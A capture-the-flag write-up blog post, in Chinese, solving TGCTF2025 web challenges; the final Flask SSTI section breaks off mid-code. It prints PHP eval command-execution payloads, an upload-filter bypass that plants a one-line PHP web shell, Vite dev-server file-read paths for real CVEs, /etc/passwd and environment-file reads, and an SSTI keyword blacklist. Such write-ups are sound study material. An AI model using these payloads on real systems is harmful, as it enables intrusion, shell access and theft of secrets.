<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>TGCTF2025-WEB WP | Sauy&#39;s corner</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="AAA偷渡阴平1234567891011121314&lt;?php$tgctf2025&#x3D;$_GET[&#x27;tgctf2025&#x27;];if(!preg_match(&quot;&#x2F;0|1|[3-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&amp;l">
<meta property="og:type" content="article">
<meta property="og:title" content="TGCTF2025-WEB WP">
<meta property="og:url" content="http://example.com/2025/04/14/TGCTF2025-WEB/index.html">
<meta property="og:site_name" content="Sauy&#39;s corner">
<meta property="og:description" content="AAA偷渡阴平1234567891011121314&lt;?php$tgctf2025&#x3D;$_GET[&#x27;tgctf2025&#x27;];if(!preg_match(&quot;&#x2F;0|1|[3-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&amp;l">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="c:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250414204645766.png">
<meta property="og:image" content="http://example.com/images/image-20250414134522190.png">
<meta property="og:image" content="http://example.com/images/image-20250414133152637.png">
<meta property="og:image" content="http://example.com/images/image-20250414134244095.png">
<meta property="og:image" content="http://example.com/images/image-20250415210925462.png">
<meta property="article:published_time" content="2025-04-13T16:00:00.000Z">
<meta property="article:modified_time" content="2025-04-17T14:13:46.305Z">
<meta property="article:author" content="Sauy">
<meta property="article:tag" content="CTF-wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250414204645766.png">
  
    <link rel="alternate" href="/atom.xml" title="Sauy's corner" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Sauy&#39;s corner</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-TGCTF2025-WEB" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/14/TGCTF2025-WEB/" class="article-date">
  <time class="dt-published" datetime="2025-04-13T16:00:00.000Z" itemprop="datePublished">2025-04-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      TGCTF2025-WEB WP
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="AAA偷渡阴平"><a href="#AAA偷渡阴平" class="headerlink" title="AAA偷渡阴平"></a><strong>AAA偷渡阴平</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;</span><br><span class="line">    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>考点无参数rce</p>
<p>文章:<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76690905/article/details/133808536">https://blog.csdn.net/2301_76690905/article/details/133808536</a></p>
<p>payload:<code>?tgctf2025=eval(end(current(get_defined_vars())));&amp;b=system(&#39;cat /flag&#39;);</code></p>
<h2 id="AAA偷渡阴平（复仇）"><a href="#AAA偷渡阴平（复仇）" class="headerlink" title="AAA偷渡阴平（复仇）"></a><strong>AAA偷渡阴平（复仇）</strong></h2><p>说是不可以用无参数 但是没有禁止session类的函数</p>
<p>;分割可以执行两个命令</p>
<p>?tgctf2025&#x3D;session_start();passthru(hex2bin(session_id()));</p>
<p>cookie:PHPSESSID&#x3D;636174202f666c6167</p>
<h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="(ez)upload"></a><strong>(ez)upload</strong></h2><p>文件上</p>
<p>dirsearch扫描可以扫出upload.php 题目提示是备份文件 于是尝试访问upload.php.bak</p>
<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;UPLOAD_PATH&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/uploads/&#x27;</span>);</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$status_code</span> = <span class="number">200</span>; <span class="comment">// 默认状态码为 200</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;php2&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;htm&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;name&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>, PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;name&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?&lt;/s&#x27;</span>, <span class="variable">$file_content</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;文件内容包含非法字符，禁止上传！&#x27;</span>;</span><br><span class="line">                <span class="variable">$status_code</span> = <span class="number">403</span>; <span class="comment">// 403 表示禁止访问</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                    <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable">$msg</span> = <span class="string">&#x27;文件上传成功！&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">                    <span class="variable">$status_code</span> = <span class="number">500</span>; <span class="comment">// 500 表示服务器内部错误</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">            <span class="variable">$status_code</span> = <span class="number">403</span>; <span class="comment">// 403 表示禁止访问</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">        <span class="variable">$status_code</span> = <span class="number">404</span>; <span class="comment">// 404 表示资源未找到</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 HTTP 状态码</span></span><br><span class="line"><span class="title function_ invoke__">http_response_code</span>(<span class="variable">$status_code</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">    <span class="string">&#x27;status_code&#x27;</span> =&gt; <span class="variable">$status_code</span>,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="variable">$msg</span>,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<p>这里发现htaccess被禁了 但是这里看到了2个非常具有特性的函数</p>
<h3 id="file-ext-pathinfo-file-name-PATHINFO-EXTENSION"><a href="#file-ext-pathinfo-file-name-PATHINFO-EXTENSION" class="headerlink" title="$file_ext = pathinfo($file_name, PATHINFO_EXTENSION);"></a><code>$file_ext = pathinfo($file_name, PATHINFO_EXTENSION);</code></h3><p>这行获取的是文件的拓展名，同时又对ph和hta进行了过滤</p>
<h3 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a><code>move_uploaded_file</code></h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file() 函数把上传的文件移动到新位置。</span><br><span class="line">如果成功该函数返回 TRUE，如果失败则返回 FALSE。</span><br></pre></td></tr></table></figure>

<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(file,newloc)</span><br><span class="line">file:必需。规定要移动的文件。</span><br><span class="line">newloc:必需。规定文件的新位置。</span><br></pre></td></tr></table></figure>

<h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注释：该函数仅用于通过 HTTP POST 上传的文件。</span><br><span class="line">注释：如果目标文件已经存在，将会被覆盖。</span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当move_uploaded_file函数参数可控时，可以尝试/.绕过，因为该函数会忽略掉文件末尾的/.，所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php</span><br></pre></td></tr></table></figure>

<p>直接先传个文件然后再把后缀改为*.php&#x2F;.即可</p>
<p>GET也要传入?name&#x3D;*.php&#x2F;.</p>
<p>然后蚁剑连接成功，找flag就好了。</p>
<h4 id="总结下"><a href="#总结下" class="headerlink" title="总结下"></a>总结下</h4><p><code>pathifo</code>函数帮助绕过对php后缀的检测 让file_ext返回值为空</p>
<p><code>move_uploaded_file</code> 函数则是帮助删除&#x2F;. 让保存文件后缀最后变为php</p>
<p>上传文件的数据包</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php?name=22.php/. HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:60681</span><br><span class="line">Content-Length: 310</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;107&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://127.0.0.1:60681</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryU4VFMZ4wbU2hEGvg</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://127.0.0.1:60681/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryU4VFMZ4wbU2hEGvg</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;; filename=&quot;22.php/.&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?=eval($_POST[&#x27;1&#x27;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryU4VFMZ4wbU2hEGvg</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传文件</span><br><span class="line">------WebKitFormBoundaryU4VFMZ4wbU2hEGvg--</span><br></pre></td></tr></table></figure>

<h2 id="前端GAME"><a href="#前端GAME" class="headerlink" title="前端GAME"></a><strong>前端GAME</strong></h2><p>进去是个小游戏 本来以为是正常思路 但是怎么都做不出 于是题目是个vue框架的游戏 于是搜索 发现有关于这个的漏洞</p>
<p>漏洞文章:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17655">Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31125）-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://www.panziye.com/front/16376.html">Vite存在CVE-2025-30208安全漏洞（附修复方案和演示示例)</a></p>
<h3 id="Vite漏洞原理"><a href="#Vite漏洞原理" class="headerlink" title="Vite漏洞原理"></a>Vite漏洞原理</h3><p>Vite在开发服务器模式下，提供了<code>@fs</code>功能，原本是为了让开发者访问服务允许范围内的文件。正常情况下，如果请求的文件超出了这个允许范围，Vite应该返回“403 Restricted”，提示访问受限。但攻击者发现了一个“漏洞”，当在请求URL中添加<code>?raw??</code>或<code>?import&amp;raw??</code>这样的特殊参数时，就能绕过原本的文件访问限制检查。</p>
<p>原因：Vite在处理请求的多个环节中，会移除类似<code>?</code>的结尾分隔符，但在查询字符串的正则匹配过程中，却没有考虑到这种特殊情况，这就给攻击者可乘之机，他们利用这个缺陷，<strong>就能读取目标文件的内容</strong>。</p>
<h3 id="题目解法"><a href="#题目解法" class="headerlink" title="题目解法"></a>题目解法</h3><p>直接按照他给的payload <code>/@fs/tgflagggg?import&amp;raw??</code></p>
<h2 id="前端GAME-Plus"><a href="#前端GAME-Plus" class="headerlink" title="前端GAME Plus"></a><strong>前端GAME Plus</strong></h2><p>上一道题的payload不可行了</p>
<p>文章未公开的poc:可以通过svg来进行文件读取 <code>/@fs/tgflagggg?import&amp;?meteorkai.svg?.wasm?init</code></p>
<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250414204645766.png" alt="image-20250414204645766"></p>
<p>得到VEdDVEZ7ZmUxM2MzZGYtYzNkNC1hYjJhLTQwZjYtNjNjYjM1MzczNjAyfQo&#x3D;</p>
<p>base64解码 TGCTF{fe13c3df-c3d4-ab2a-40f6-63cb35373602}</p>
<h2 id="前端GAME-Ultra"><a href="#前端GAME-Ultra" class="headerlink" title="前端GAME Ultra"></a><strong>前端GAME Ultra</strong></h2><p>plus的payload也不可以</p>
<p><code>/@fs/app#/../proc/self/environ</code>读环境变量</p>
<p>也可以 <code>/@fs/app/vite-project/#/../../../../../tgflagggg</code></p>
<h2 id="直面天命"><a href="#直面天命" class="headerlink" title="直面天命"></a><strong>直面天命</strong></h2><p>访问&#x2F;hint 提示是一个四个小写英文字母的路由 爆出来是&#x2F;aazz路由</p>
<p>进去f12 看到说是可以传参数 but不知道参数是什么 那就arjun爆破吧 爆出来是filename</p>
<p>看到fillename参数 一般会考虑到ssrf 就像name是ssti一样</p>
<p>传入<code>?filename=/etc/passwd</code></p>
<p>可以读取 尝试读取环境变量</p>
<p><code>?filename=/proc/1/environ</code> </p>
<p>也可以直接读&#x2F;flag</p>
<h2 id="直面天命（复仇）"><a href="#直面天命（复仇）" class="headerlink" title="直面天命（复仇）"></a><strong>直面天命（复仇）</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory</span><br><span class="line"><span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">black_list=[<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;_.&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;application&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span></span><br><span class="line">    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace</span><br><span class="line">    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>():</span><br><span class="line">    template1=<span class="string">&quot;&quot;</span></span><br><span class="line">    template2=<span class="string">&quot;&quot;</span></span><br><span class="line">    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> waf(name):</span><br><span class="line">        template = <span class="string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹</span></span><br><span class="line"><span class="string">Image&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">if</span> is_typable(i):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            k=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> k==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (secret_key[:<span class="number">2</span>] <span class="keyword">in</span> name <span class="keyword">and</span> secret_key[<span class="number">2</span>:]):</span><br><span class="line">                template = <span class="string">&#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">再去西行历练历练</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Image&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(template)</span><br><span class="line">            template1 = <span class="string">&quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”</span></span><br><span class="line"><span class="string">最后，如果你用了cat，就可以见到齐天大圣了</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">            template= template.replace(<span class="string">&quot;天命&quot;</span>,<span class="string">&quot;&#123;&#123;&quot;</span>).replace(<span class="string">&quot;难违&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>)</span><br><span class="line">            template = template</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">in</span> template:</span><br><span class="line">        template2 = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">或许你这只叫天命人的猴子，真的能做到？</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Image&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> template1+render_template_string(template)+render_template_string(template2)</span><br><span class="line">    <span 